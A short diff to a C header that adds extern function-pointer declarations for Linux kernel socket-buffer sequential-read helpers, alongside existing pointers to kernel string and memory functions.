@@ -55,6 +55,11 @@ extern struct socket * (*f_sock_from_file)(struct file *file, int *err);
 extern size_t (*f_strlen)(const char *);
 extern int (*f_kstrtoull)(const char *s, unsigned int base, unsigned long long *res);
 extern void * (*f_memcpy)(void *dest, const void *src, size_t count);
+extern void (*f_skb_prepare_seq_read)(struct sk_buff *skb, unsigned int from,
+			  unsigned int to, struct skb_seq_state *st);
+extern unsigned int (*f_skb_seq_read)(unsigned int consumed, const u8 **data,
+			  struct skb_seq_state *st);
+extern void (*f_skb_abort_seq_read)(struct skb_seq_state *st);
 
 extern void *kernel_addr;
 extern size_t kernel_len, kernel_paglen, kernel_pages;
